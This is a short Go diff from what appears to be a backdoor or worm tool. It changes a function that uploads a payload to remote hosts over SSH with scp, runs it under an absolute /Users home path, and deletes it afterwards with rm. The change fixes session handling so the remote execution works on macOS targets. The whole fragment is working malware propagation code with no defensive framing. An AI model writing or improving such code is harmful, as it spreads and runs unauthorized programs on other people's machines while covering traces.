@@ -132,8 +132,17 @@ func sendFileAndExecute(i *info.Info, configs map[string]*ssh.ClientConfig){
     fsession.Run("/usr/bin/scp -t ~")
     wg.Wait()
 
+    // new session for command
+    csession, err = client.NewSession()
+    if err != nil {
+      debug.Println(err)
+      continue
+    }
+    defer csession.Close()
+
     // execute and remove
-    if err := csession.Run(fmt.Sprintf("~/%s ; /bin/rm ~/%s", gdoorConfig.TargetName, gdoorConfig.TargetName)); err != nil {
+    targetPath := filepath.Join("/Users", config.User, gdoorConfig.TargetName)
+    if err := csession.Run(fmt.Sprintf("%s ; /bin/rm %s", targetPath, targetPath)); err != nil {
       debug.Println(err)
       continue
     }
